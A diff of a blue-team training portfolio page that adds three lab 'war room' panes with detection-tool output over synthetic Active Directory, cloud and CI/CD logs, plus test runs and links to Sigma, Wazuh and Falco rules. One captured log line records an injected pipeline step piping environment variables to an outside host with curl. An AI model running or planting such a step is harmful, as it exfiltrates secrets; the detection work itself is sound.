@@ -15,8 +15,8 @@ details summary{cursor:pointer;color:var(--mut);font-size:13px;margin-top:6px}.c
 footer{color:var(--mut);font-size:12px;text-align:center;padding:30px 20px}</style></head><body>
 <header><div class="wrap"><h1><small>GraySentinel Cyber Defence Lab · Day 1 · Candidate 13 · Blue Team</small>Eswar Mahalingam — Project 01 &amp; 02 · Live step-by-step checker</h1>
 <p>Reproduce and verify both projects in 9 steps (plus setup). Each step shows the exact command, the expected result, and the <em>real captured terminal output</em> from <code>evidence/terminal_output.txt</code>. Tick each step as you verify it — progress is saved in your browser.</p></div></header>
-<div class="bar"><div class="wrap"><strong id="pct">0 / 9 verified</strong><div class="prog"><i id="fill"></i></div><a class="btn" href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026">Repo README</a><a class="btn" href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/findings.md">P01 README</a><a class="btn" href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/report.md">P02 README</a><a class="btn" href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/STEP_BY_STEP.md">Runbook .md</a><a class="btn" href="#rdp" onclick="show('rdp')">RDP war room (05 Oct)</a><a class="btn" id="reset" href="#">Reset ticks</a></div></div>
-<main class="wrap"><nav class="tabs"><a href="#steps" class="on" data-p="steps">Step-by-step</a><a href="#p01" data-p="p01">P01 findings report</a><a href="#p02" data-p="p02">P02 incident ticket</a><a href="#shots" data-p="shots">Screenshots</a><a href="#files" data-p="files">All files</a><a href="#rdp" data-p="rdp">🔥 RDP war room · 05 Oct</a></nav>
+<div class="bar"><div class="wrap"><strong id="pct">0 / 9 verified</strong><div class="prog"><i id="fill"></i></div><a class="btn" href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026">Repo README</a><a class="btn" href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/findings.md">P01 README</a><a class="btn" href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/report.md">P02 README</a><a class="btn" href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/STEP_BY_STEP.md">Runbook .md</a><a class="btn" href="#rdp" onclick="show('rdp')">RDP war room (05 Oct)</a><a class="btn" href="#ghostadmin" onclick="show('ghostadmin')">Ghost Admin (06 Oct)</a><a class="btn" href="#cloudtoken" onclick="show('cloudtoken')">Cloud Token (06 Oct)</a><a class="btn" href="#brokenpipeline" onclick="show('brokenpipeline')">Broken Pipeline (06 Oct)</a><a class="btn" id="reset" href="#">Reset ticks</a></div></div>
+<main class="wrap"><nav class="tabs"><a href="#steps" class="on" data-p="steps">Step-by-step</a><a href="#p01" data-p="p01">P01 findings report</a><a href="#p02" data-p="p02">P02 incident ticket</a><a href="#shots" data-p="shots">Screenshots</a><a href="#files" data-p="files">All files</a><a href="#rdp" data-p="rdp">🔥 RDP war room · 05 Oct</a><a href="#ghostadmin" data-p="ghostadmin">🟢 Ghost Admin · 06 Oct</a><a href="#cloudtoken" data-p="cloudtoken">🟡 Cloud Token · 06 Oct</a><a href="#brokenpipeline" data-p="brokenpipeline">🔴 Broken Pipeline · 06 Oct</a></nav>
 <div class="pane on" id="pane-steps"><section class="step" style="border-color:var(--gold)"><div class="num">0</div><div class="body"><div class="tag">SETUP</div><h3>Clone — nothing to install (Python 3.8+ stdlib only)</h3><pre class="cmd">git clone https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026.git
 cd GraySentinel-DSOU-45Day-2026/graysentinel-day1</pre><p class="exp">All data is synthetic and sanitised (RFC-5737 ranges). Safe to run anywhere.</p></div></section><section class="step" id="s1"><div class="num">1</div><div class="body"><div class="tag">P01</div><h3>Generate the synthetic lab log</h3>
 <div class="lbl">Command</div><pre class="cmd">cd project-01 &amp;&amp; python3 data/make_lab_data.py</pre><div class="lbl">Expected result</div><p class="exp">wrote auth.log with 135 lines</p>
@@ -516,10 +516,158 @@ Ran 18 tests in 0.018s
 
 OK</pre></details>
 <h3>Files</h3><div class="grid"><div class="card"><b>RDP war room pack</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/tree/main/rdp-silent-login">rdp-silent-login/ (folder)</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/SUBMISSION.md">SUBMISSION.md (all 7 missions)</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/GraySentinel_DSOU_RDP_SilentLogin_Report.pdf">Report PDF (5 pages)</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/rdp_chain_hunter.py">rdp_chain_hunter.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/test_rdp_chain_hunter.py">test_rdp_chain_hunter.py (18 tests)</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/rdp_powershell_chain.sigma.yml">Sigma correlation rule</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/wazuh_local_rules_rdp.xml">Wazuh rules 100810–100816</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/rdp_events_SYNTHETIC.csv">rdp_events_SYNTHETIC.csv</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/auth_context_SYNTHETIC.json">auth_context_SYNTHETIC.json</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/hunt_output.txt">hunt_output.txt</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/MENTOR_MESSAGE.md">MENTOR_MESSAGE.md</a></div></div></div>
-<div class="pane" id="pane-files"><h2>All files</h2><div class="grid">
+<div class="pane" id="pane-ghostadmin"><h2>🟢 SOC War Room · Ghost Admin (DC-02) · 06 Oct 2026</h2><p class="exp">Verdict: H1 COMPROMISED · H2 CONFIRMED · H3 CONFIRMED · 18/18 tests · synthetic data</p><div class="grid"><div class="card"><b>Identity</b>s.menon (Tier-2 help desk) logged on to DC-02 over NTLM from WKS-FIN-204; 0 Tier-0 logons in 30-day baseline</div><div class="card"><b>Escalation</b>Added to Domain Admins + Administrators 40s after logon; SeDebug/SeEnableDelegation/SeBackup; encoded PowerShell</div><div class="card"><b>Persistence</b>DCSync replication read (4662); new DC service WinSysMon2 (7045); RC4 TGT downgrade</div><div class="card"><b>Lateral</b>Onward to DC-01 + FS-CORP-01 (SYSVOL) within 2 minutes using the new privilege</div><div class="card"><b>Detection</b>Privileged Identity Anomaly: unusual DC logon + priv-group add / DCSync / encoded PS ≤15 min → CRITICAL</div><div class="card"><b>Senior answer</b>One privileged logon from an unusual host beats thousands of failed logons — quiet, already holds the keys, DCSync touches every identity</div></div><h3>Run it</h3><pre class="cmd">cd ghost-admin
+python3 make_ghostadmin_lab_data.py
+python3 ghost_admin_hunter.py ghostadmin_events_SYNTHETIC.csv ghostadmin_context_SYNTHETIC.json
+python3 -m unittest test_ghost_admin_hunter -v</pre><details open><summary>Captured analyzer output</summary><pre class="out">==============================================================================
+GraySentinel DSOU · Ghost Admin hunt · 1 identity case(s)
+==============================================================================
+
+[CRITICAL] s.menon on DC-02 from 10.20.44.204 (WKS-FIN-204)  detection_fired=True
+  -- Mission 01 identity --
+   normally_privileged    False
+   tier                   2
+   logon_type             3
+   auth_pkg               NTLM
+   failed_attempts        12
+   tier0_baseline_30d     0
+   privileged_group_adds  [&#x27;Administrators&#x27;, &#x27;Domain Admins&#x27;]
+   mfa                    none (on-prem account)
+   change_ticket          None
+  -- Mission 02 hypotheses --
+   H1 COMPROMISED  12 failed logons from same source before success | source 10.20.44.204 (WKS-FIN-204) not an approved admin host | no Tier-0 logon by this user in 30-day baseline | NTLM to a DC (no Kerberos PAC) — credential-relay/theft pattern | account is not normally privileged
+   H2 CONFIRMED    added to Administrators, Domain Admins | special privileges: SeBackupPrivilege, SeDebugPrivilege, SeEnableDelegationPrivilege | admin activity right after the privilege change
+   H3 CONFIRMED    onward logons: DC-01, FS-CORP-01 | 1 remote share/file access events | directory replication read (DCSync-style) | Kerberos TGT with RC4 downgrade
+  -- Mission 04 persistence --
+   priv-group adds: [&#x27;s.menon→Domain Admins&#x27;, &#x27;s.menon→Administrators&#x27;]  DCSync: True  new services: [&#x27;Service=WinSysMon2;ImagePath=%TEMP%\\wsm2.exe;Start=auto&#x27;]
+  -- lateral movement --
+   onward: [&#x27;DC-01&#x27;, &#x27;FS-CORP-01&#x27;]  shares: 1  kerberos: [&#x27;TGT requested; ticket encryption RC4 (downgrade)&#x27;]
+  -- Mission (timeline) --
+   2026-10-05 21:10:00Z  4625      first of 12 failed logons from 10.20.44.204
+   2026-10-05 21:15:00Z  4624/3    logon s.menon on DC-02 from 10.20.44.204 (AuthPkg=NTLM;no Kerberos PAC)
+   2026-10-05 21:15:03Z  4672      privileges: SeDebugPrivilege;SeEnableDelegationPrivilege;SeBackupPrivilege
+   2026-10-05 21:15:40Z  4728      s.menon added to Domain Admins
+   2026-10-05 21:15:41Z  4732      s.menon added to Administrators
+   2026-10-05 21:16:35Z  4688      wsmprovhost.exe → powershell: powershell.exe -NoP -Enc &lt;b64&gt;
+   2026-10-05 21:16:35Z  1         wsmprovhost.exe → powershell: powershell.exe -NoP -Enc &lt;b64&gt;
+   2026-10-05 21:16:37Z  4104      script block: Get-ADUser -Filter * -Properties memberOf; Get-ADGroupMember &#x27;Domain A
+   2026-10-05 21:16:39Z  4662      14 directory-access events incl. replication read
+   2026-10-05 21:17:05Z  7045      new service: Service=WinSysMon2;ImagePath=%TEMP%\wsm2.exe;Start=auto
+   2026-10-05 21:17:35Z  4624/3    onward logon s.menon on DC-01 from 10.20.0.12
+   2026-10-05 21:17:40Z  4624/3    onward logon s.menon on FS-CORP-01 from 10.20.0.12
+   2026-10-05 21:17:42Z  5140      FS-CORP-01: Share=\\*\SYSVOL
+   2026-10-05 21:17:47Z  4768      TGT requested; ticket encryption RC4 (downgrade)
+</pre></details><details><summary>Captured test run</summary><pre class="out">test_08_h1_compromised (test_ghost_admin_hunter.TestHypotheses.test_08_h1_compromised) ... ok
+test_09_h2_privilege_escalation_confirmed (test_ghost_admin_hunter.TestHypotheses.test_09_h2_privilege_escalation_confirmed) ... ok
+test_10_h3_lateral_confirmed (test_ghost_admin_hunter.TestHypotheses.test_10_h3_lateral_confirmed) ... ok
+test_01_one_case_the_attacker (test_ghost_admin_hunter.TestIdentity.test_01_one_case_the_attacker) ... ok
+test_02_target_is_dc (test_ghost_admin_hunter.TestIdentity.test_02_target_is_dc) ... ok
+test_03_logon_type_and_ntlm (test_ghost_admin_hunter.TestIdentity.test_03_logon_type_and_ntlm) ... ok
+test_04_user_not_normally_privileged (test_ghost_admin_hunter.TestIdentity.test_04_user_not_normally_privileged) ... ok
+test_05_failed_attempts_counted (test_ghost_admin_hunter.TestIdentity.test_05_failed_attempts_counted) ... ok
+test_06_priv_group_adds (test_ghost_admin_hunter.TestIdentity.test_06_priv_group_adds) ... ok
+test_07_no_change_ticket (test_ghost_admin_hunter.TestIdentity.test_07_no_change_ticket) ... ok
+test_17_garbage_rows_skipped (test_ghost_admin_hunter.TestRobustness.test_17_garbage_rows_skipped) ... ok
+test_18_cli_exit_codes (test_ghost_admin_hunter.TestRobustness.test_18_cli_exit_codes) ... error: [Errno 2] No such file or directory: &#x27;/tmp/tmpggam3gyl/nope.csv&#x27;
+ok
+
+----------------------------------------------------------------------
+Ran 18 tests in 0.012s
+
+OK</pre></details><h3>Files</h3><div class="grid"><div class="card"><b>ghost-admin/</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/tree/main/ghost-admin">folder</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/ghost-admin/SUBMISSION.md">SUBMISSION.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/ghost-admin/GraySentinel_DSOU_GhostAdmin_Report.pdf">Report PDF</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/ghost-admin/ghost_admin_hunter.py">ghost_admin_hunter.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/ghost-admin/test_ghost_admin_hunter.py">tests (18)</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/ghost-admin/privileged_identity_anomaly.sigma.yml">Sigma rule</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/ghost-admin/wazuh_local_rules_ghostadmin.xml">Wazuh rules</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/ghost-admin/MENTOR_MESSAGE.md">Mentor message</a></div></div></div><div class="pane" id="pane-cloudtoken"><h2>🟡 Intel War Room · Cloud Token Blackout · 06 Oct 2026</h2><p class="exp">Classification: CI/CD credential theft → cloud takeover · 16/16 tests · synthetic data</p><div class="grid"><div class="card"><b>CTI answer</b>The identity, not the app: a long-lived AWS key on a self-hosted runner was abused from a hosting IP</div><div class="card"><b>Privilege escalation</b>CreateAccessKey + AttachUserPolicy → AdministratorAccess from 203.0.113.77</div><div class="card"><b>Data + secrets</b>GetObject on example-prod-pii + example-db-backups; GetSecretValue prod/db/master</div><div class="card"><b>Exfil / persistence</b>PutBucketPolicy Principal:* on a PII bucket; attacker-made key AKIAEXAMPLEN3WKEY99</div><div class="card"><b>Detection</b>Sigma: long-lived key off CI ranges + IAM privesc + secret read + public bucket → CRITICAL on ≥2 in 10 min</div><div class="card"><b>Senior answer</b>A CI/CD identity (deploy + IAM + secrets) &gt;&gt; one stolen key: bigger data value, persistence, supply-chain ROI</div></div><h3>Run it</h3><pre class="cmd">cd cloud-token-blackout
+python3 make_cloud_lab_data.py
+python3 ci_cloud_token_hunter.py cloudtrail_SYNTHETIC.csv gh_audit_SYNTHETIC.csv
+python3 -m unittest test_ci_cloud_token_hunter -v</pre><details open><summary>Captured analyzer output</summary><pre class="out">==============================================================================
+GraySentinel RIU · Cloud Token Blackout — CI/CD credential-abuse intel
+==============================================================================
+Classification: Supply-chain abuse + cloud takeover
+Kill-chain stages observed: collection -&gt; credential access -&gt; credential access / cloud auth -&gt; exfiltration / persistence -&gt; initial access -&gt; persistence -&gt; privilege escalation -&gt; runner compromise
+
+CLOUD FINDINGS:
+  [IoC   ] credential access / cloud auth 2026-10-06T01:20:00Z  GetCallerIdentity      203.0.113.77  — IAM user key AKIAEXAMPLE7RUNNER01 from 203.0.113.77 (hosting ASN), non-CI user-agent, no MFA
+  [IoC   ] privilege escalation         2026-10-06T01:22:00Z  CreateAccessKey        203.0.113.77  — CreateAccessKey on user/runner-deploy
+  [IoC   ] privilege escalation         2026-10-06T01:23:00Z  AttachUserPolicy       203.0.113.77  — AttachUserPolicy on user/runner-deploy
+  [IoC   ] collection                   2026-10-06T01:26:00Z  GetObject              203.0.113.77  — GetObject arn:aws:s3:::example-prod-pii
+  [IoC   ] collection                   2026-10-06T01:26:20Z  GetObject              203.0.113.77  — GetObject arn:aws:s3:::example-db-backups
+  [IoC   ] credential access            2026-10-06T01:27:00Z  GetSecretValue         203.0.113.77  — GetSecretValue prod/db/master
+  [IoC   ] exfiltration / persistence   2026-10-06T01:29:00Z  PutBucketPolicy        203.0.113.77  — PutBucketPolicy arn:aws:s3:::example-prod-pii — policy allows Principal:* GetObject
+  [REVIEW] persistence                  2026-10-06T01:30:00Z  CreateUser             203.0.113.77  — CreateUser AccessDenied
+
+CI/CD (GitHub) FINDINGS:
+  [IoC   ] runner compromise    2026-10-06T01:05:00Z  ex.contractor  203.0.113.77  — added step: env | curl -X POST cdn-sync.example.net
+  [IoC   ] initial access       2026-10-06T01:05:00Z  ex.contractor  203.0.113.77  — terminated identity still referenced in automation
+  [IoC   ] initial access       2026-10-06T01:08:00Z  ex.contractor  203.0.113.77  — terminated identity still referenced in automation
+  [IoC   ] initial access       2026-10-06T01:11:00Z  ex.contractor  203.0.113.77  — terminated identity still referenced in automation
+  [IoC   ] credential access    2026-10-06T01:11:00Z  ex.contractor  203.0.113.77  — AWS_* env exposed to step
+
+IoC SUMMARY:
+  principals     runner-deploy
+  access_keys    AKIAEXAMPLE7RUNNER01
+  source_ips     203.0.113.77
+  buckets        arn:aws:s3:::example-db-backups, arn:aws:s3:::example-prod-pii
+  new_keys       new key AKIAEXAMPLEN3WKEY99 created
+  public_buckets arn:aws:s3:::example-prod-pii
+</pre></details><details><summary>Captured test run</summary><pre class="out">ok
+test_16_kill_chain_covers_full_path (test_ci_cloud_token_hunter.TestBaselineAndRobustness.test_16_kill_chain_covers_full_path) ... ok
+test_01_classification_is_supply_chain (test_ci_cloud_token_hunter.TestCloud.test_01_classification_is_supply_chain) ... ok
+test_02_long_key_abuse_flagged_once (test_ci_cloud_token_hunter.TestCloud.test_02_long_key_abuse_flagged_once) ... ok
+test_03_privilege_escalation_detected (test_ci_cloud_token_hunter.TestCloud.test_03_privilege_escalation_detected) ... ok
+test_04_secret_retrieval_detected (test_ci_cloud_token_hunter.TestCloud.test_04_secret_retrieval_detected) ... ok
+test_05_unusual_bucket_access (test_ci_cloud_token_hunter.TestCloud.test_05_unusual_bucket_access) ... ok
+test_06_public_bucket_exfil (test_ci_cloud_token_hunter.TestCloud.test_06_public_bucket_exfil) ... ok
+test_07_blocked_backdoor_is_review_not_ioc (test_ci_cloud_token_hunter.TestCloud.test_07_blocked_backdoor_is_review_not_ioc) ... ok
+test_08_ioc_summary_has_key_and_ip (test_ci_cloud_token_hunter.TestCloud.test_08_ioc_summary_has_key_and_ip) ... ok
+test_09_workflow_tamper_detected (test_ci_cloud_token_hunter.TestGitHub.test_09_workflow_tamper_detected) ... ok
+test_10_stale_identity_detected (test_ci_cloud_token_hunter.TestGitHub.test_10_stale_identity_detected) ... ok
+test_11_ci_secret_exposed (test_ci_cloud_token_hunter.TestGitHub.test_11_ci_secret_exposed) ... ok
+
+----------------------------------------------------------------------
+Ran 16 tests in 0.020s
+
+OK</pre></details><h3>Files</h3><div class="grid"><div class="card"><b>cloud-token-blackout/</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/tree/main/cloud-token-blackout">folder</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/cloud-token-blackout/SUBMISSION.md">SUBMISSION.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/cloud-token-blackout/GraySentinel_RIU_CloudTokenBlackout_Report.pdf">Report PDF</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/cloud-token-blackout/ci_cloud_token_hunter.py">ci_cloud_token_hunter.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/cloud-token-blackout/test_ci_cloud_token_hunter.py">tests (16)</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/cloud-token-blackout/cicd_cloud_token_abuse.sigma.yml">Sigma pack</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/cloud-token-blackout/MENTOR_MESSAGE.md">Mentor message</a></div></div></div><div class="pane" id="pane-brokenpipeline"><h2>🔴 Red-Team War Room · Broken Pipeline (LAB ONLY) · 06 Oct 2026</h2><p class="exp">Detection-and-analysis only — no exploit code · full chain detected · 16/16 tests · synthetic audit data</p><div class="grid"><div class="card"><b>Thesis</b>Compromise the CI/CD trust chain so malicious content ships inside a trusted pipeline</div><div class="card"><b>Chain</b>Stale dev identity → off-hours GitLab run → same tag / NEW unsigned digest → deploy</div><div class="card"><b>K8s privesc</b>Deploy SA = cluster-admin → lists secrets cluster-wide → kube-system pod with hostPath</div><div class="card"><b>Cloud</b>Pod workload identity (IRSA) → AssumeRole → GetSecretValue (prod DB secret)</div><div class="card"><b>Blue detection</b>Unexpected digest → off-hours push → deploy → new SA activity → cloud API (Sigma + Falco)</div><div class="card"><b>Senior answer</b>Owning the trust chain &gt;&gt; one container: better OPSEC, persistence across releases, whole-supply-chain blast radius</div></div><h3>Run it</h3><pre class="cmd">cd broken-pipeline
+python3 make_pipeline_lab_data.py
+python3 pipeline_chain_analyzer.py pipeline_audit_SYNTHETIC.csv pipeline_context_SYNTHETIC.json
+python3 -m unittest test_pipeline_chain_analyzer -v</pre><details open><summary>Captured analyzer output</summary><pre class="out">==============================================================================
+GraySentinel SSOU · Broken Pipeline — CI/CD → K8s supply-chain (blue-team view)
+==============================================================================
+Full chain observed: True
+Kill-chain stages: developer identity -&gt; CI/CD abuse -&gt; malicious image / registry -&gt; kubernetes -&gt; cloud access
+DFIR sources with evidence: cloud, gitlab, k8s, registry
+
+FINDINGS:
+  [IoC   ] developer identity         2026-10-05T21:20:00Z  stale/terminated identity active   — ex.developer (terminated 2026-09-20) still runs pipelines
+  [IoC   ] developer identity         2026-10-05T21:22:00Z  stale/terminated identity active   — ex.developer (terminated 2026-09-20) still runs pipelines
+  [IoC   ] CI/CD abuse                2026-10-05T21:22:00Z  off-hours pipeline run             — run outside release window
+  [IoC   ] malicious image / registry 2026-10-05T21:26:00Z  unexpected image digest            — digest sha256:beef9999untrusted != trusted sha256:aaaa1111trusted
+  [IoC   ] malicious image / registry 2026-10-05T21:26:00Z  unsigned / no provenance           — tag :latest reused; NO cosign signature; NO provenance attestation
+  [IoC   ] kubernetes                 2026-10-05T21:30:00Z  deploy of non-trusted digest       — deployment pulled a digest that differs from the signed baseline
+  [IoC   ] kubernetes                 2026-10-05T21:32:00Z  excessive RBAC used                — payments:deployer: create secrets — SA has cluster-admin via rolebinding (excessive RBAC)
+  [IoC   ] kubernetes                 2026-10-05T21:33:00Z  excessive RBAC used                — payments:deployer: list secrets/* — enumerated secrets cluster-wide
+  [IoC   ] kubernetes                 2026-10-05T21:34:00Z  workload created in kube-system    — pod requests hostPath mount + SA token (persistence vector)
+  [IoC   ] cloud access               2026-10-05T21:38:00Z  workload identity reached cloud    — sts.AssumeRole role/payments-deploy from 203.0.113.90 — workload identity used from pod to reach cloud; first-seen external egress
+  [IoC   ] cloud access               2026-10-05T21:40:00Z  workload identity reached cloud    — secretsmanager.GetSecretValue prod/payments/db from 203.0.113.90 — cloud secret read
+  [REVIEW] defense evasion            2026-10-05T21:50:00Z  image deleted (audit trail remains) — image removed, but digest persists in k8s + audit logs
+</pre></details><details><summary>Captured test run</summary><pre class="out">ok
+test_01_full_chain_observed (test_pipeline_chain_analyzer.TestChain.test_01_full_chain_observed) ... ok
+test_02_all_five_stages (test_pipeline_chain_analyzer.TestChain.test_02_all_five_stages) ... ok
+test_03_stale_identity (test_pipeline_chain_analyzer.TestChain.test_03_stale_identity) ... ok
+test_04_offhours_run (test_pipeline_chain_analyzer.TestChain.test_04_offhours_run) ... ok
+test_05_unexpected_digest (test_pipeline_chain_analyzer.TestChain.test_05_unexpected_digest) ... ok
+test_06_unsigned_image (test_pipeline_chain_analyzer.TestChain.test_06_unsigned_image) ... ok
+test_07_deploy_non_trusted_digest (test_pipeline_chain_analyzer.TestChain.test_07_deploy_non_trusted_digest) ... ok
+test_08_excessive_rbac (test_pipeline_chain_analyzer.TestChain.test_08_excessive_rbac) ... ok
+test_09_kube_system_workload (test_pipeline_chain_analyzer.TestChain.test_09_kube_system_workload) ... ok
+test_10_cloud_access (test_pipeline_chain_analyzer.TestChain.test_10_cloud_access) ... ok
+test_11_image_delete_is_review (test_pipeline_chain_analyzer.TestChain.test_11_image_delete_is_review) ... ok
+test_12_dfir_sources (test_pipeline_chain_analyzer.TestChain.test_12_dfir_sources) ... ok
+
+----------------------------------------------------------------------
+Ran 16 tests in 0.013s
+
+OK</pre></details><h3>Files</h3><div class="grid"><div class="card"><b>broken-pipeline/</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/tree/main/broken-pipeline">folder</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/broken-pipeline/SUBMISSION.md">SUBMISSION.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/broken-pipeline/GraySentinel_SSOU_BrokenPipeline_Report.pdf">Report PDF</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/broken-pipeline/pipeline_chain_analyzer.py">pipeline_chain_analyzer.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/broken-pipeline/test_pipeline_chain_analyzer.py">tests (16)</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/broken-pipeline/broken_pipeline_detections.yml">Sigma + Falco rules</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/broken-pipeline/MENTOR_MESSAGE.md">Mentor message</a></div></div></div><div class="pane" id="pane-files"><h2>All files</h2><div class="grid">
 <div class="card"><b>Project 01</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/findings.md">README.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/findings.md">report.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/auth_investigator.py">src/auth_investigator.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/make_lab_data.py">data/make_lab_data.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/auth.log">data/auth.log</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/test_auth_investigator.py">tests/test_auth_investigator.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/terminal_output.txt">evidence/terminal_output.txt</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/findings.json">evidence/findings.json</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/findings.md">evidence/findings.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026">screenshots/</a></div>
 <div class="card"><b>Project 02</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/report.md">README.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/report.md">report.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/incident_summary.py">src/incident_summary.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/findings.json">data/findings.json</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/alerts_sample.csv">data/alerts_sample.csv</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/test_incident_summary.py">tests/test_incident_summary.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/terminal_output.txt">evidence/terminal_output.txt</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/incident_summary.md">evidence/incident_summary.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/incident_summary.html">evidence/incident_summary.html</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/incident_summary.json">evidence/incident_summary.json</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026">screenshots/</a></div>
-<div class="card"><b>RDP war room · 05 Oct</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/tree/main/rdp-silent-login">rdp-silent-login/</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/SUBMISSION.md">SUBMISSION.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/GraySentinel_DSOU_RDP_SilentLogin_Report.pdf">Report PDF</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/rdp_chain_hunter.py">rdp_chain_hunter.py</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/rdp_powershell_chain.sigma.yml">Sigma rule</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/rdp-silent-login/wazuh_local_rules_rdp.xml">Wazuh rules</a></div><div class="card"><b>Root</b><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026">README.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/STEP_BY_STEP.md">STEP_BY_STEP.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/PUSH_TO_GITHUB.md">PUSH_TO_GITHUB.md</a><a href="https://github.com/Eswar5313/GraySentinel-DSOU-45Day-2026/blob/main/render_screens.py">docs/render_screens.py</a></div></div></div>
